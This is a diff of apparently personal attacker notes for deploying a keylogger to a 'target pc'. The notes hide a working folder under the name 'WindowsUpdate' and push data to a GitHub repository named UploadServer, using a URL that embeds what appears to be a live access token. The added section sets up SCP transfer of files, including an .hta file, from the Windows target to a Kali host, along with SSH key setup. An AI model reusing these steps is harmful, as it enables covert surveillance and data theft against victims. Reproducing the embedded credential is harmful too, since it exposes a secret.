@@ -36,7 +36,7 @@ downloading keylooger to target pc
  ===================================== 
  Setup working directory to target
  =====================================
- cd $ENV:UserProfile'
+ cd $ENV:UserProfile
  mkdir WindowsUpdate
  cd WindowsUpdate
  mkdir security
@@ -69,3 +69,20 @@ downloading keylooger to target pc
  git remote add origin https://github.com/HAXORK8880/UploadServer.git
  git remote set-url origin https://github.com/HAXORK8880/UploadServer.git
  git push https://HAXORK8880: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@github.com/HAXORK8880/UploadServer.git
+
+
+File Transfer server setup for windows
+=========================================
+cd $ENV:UserProfile
+ssh-keygen -t rsa -b 2048
+Get-Content $env:USERPROFILE\.ssh\id_rsa.pub
+scp testfile.txt kali@192.168.1.137:/home/kali/Desktop/uploads/
+scp 'Windows-health.hta' kali@192.168.1.137:/home/kali/Desktop/uploads/
+setup for kali linux
+=========================
+apt install openssh-server
+systemctl start ssh
+ systemctl enable ssh
+ufw allow ssh
+mkdir -p ~/.ssh
+echo "<paste copied public key here>" >> ~/.ssh/authorized_keys
